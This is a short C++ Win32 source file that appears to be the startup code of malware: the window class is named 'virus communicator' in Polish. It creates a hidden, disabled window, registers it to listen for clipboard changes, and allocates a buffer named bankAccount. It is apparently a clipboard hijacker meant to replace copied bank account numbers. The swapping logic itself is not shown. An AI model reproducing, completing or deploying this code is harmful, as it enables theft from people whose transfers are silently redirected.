#include "main.h"

const char szClassName[] = "KomunikatorWirusa";
HWND hwndThis;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if (!init(hInstance)) return 1;

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

bool init(HINSTANCE hInstance)
{
	WNDCLASSEX wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hIcon = NULL;
	wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wc.hbrBackground = NULL;
	wc.lpszMenuName = NULL;
	wc.lpszClassName = szClassName;
	wc.hIconSm = NULL;

	if (!RegisterClassEx(&wc)) return false;

	hwndThis = CreateWindowEx(
		NULL,
		szClassName,
		"",
		WS_DISABLED,
		0, 0, 0, 0,
		NULL,
		NULL,
		hInstance,
		NULL
	);

	if (hwndThis == NULL) return false;
	if (!AddClipboardFormatListener(hwndThis)) return false;

	messageCode = RegisterWindowMessage((LPCSTR)"Nic podejrzanego");


	bankAccount = (char*)malloc(17 * sizeof(char));
	bAset = false;
	time(&start);

	return true;
}